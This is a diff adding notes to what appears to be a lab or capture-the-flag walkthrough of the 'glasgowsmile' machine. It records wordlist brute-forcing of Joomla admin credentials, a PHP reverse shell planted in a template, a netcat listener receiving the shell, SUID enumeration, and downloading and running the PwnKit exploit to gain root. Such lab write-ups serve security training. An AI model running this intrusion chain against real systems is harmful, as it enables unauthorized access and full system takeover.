@@ -40,6 +40,75 @@ GENERATED WORDS: 4612
 
 
 
-everyone i have seen complete this box has used cewl
+┌──(root㉿kali)-[/home/kali]
+└─# cewl http://192.168.243.79/joomla/administrator/ -d 4 -m 5 -w cewl.txt
+CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+                                                                                   
 
+
+then we launch a clusterbomb attack
+
+
+we find Joomla:Gotham
+
+
+
+Extensions > Templates > Templates
+
+edit index.php with pentest monkey reverse php
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [192.168.45.212] from (UNKNOWN) [192.168.243.79] 52204
+Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+ 04:35:01 up 21 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+
+www-data@glasgowsmile:/home$ ls
+abner  penguin	rob
+www-data@glasgowsmile:/home$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/chfn
+
+
+
+
+www-data@glasgowsmile:/tmp$ wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O pwnkit
+--2025-11-17 04:40:02--  https://github.com/ly4k/PwnKit/raw/main/PwnKit
+Resolving github.com (github.com)... 140.82.112.3
+Connecting to github.com (github.com)|140.82.112.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit [following]
+--2025-11-17 04:40:02--  https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18040 (18K) [application/octet-stream]
+Saving to: ‘pwnkit’
+
+pwnkit                        100%[==============================================>]  17.62K  --.-KB/s    in 0s      
+
+2025-11-17 04:40:02 (116 MB/s) - ‘pwnkit’ saved [18040/18040]
+
+www-data@glasgowsmile:/tmp$ chmod +x pwnkit
+www-data@glasgowsmile:/tmp$ ./pwnkit
+root@glasgowsmile:/tmp#
 
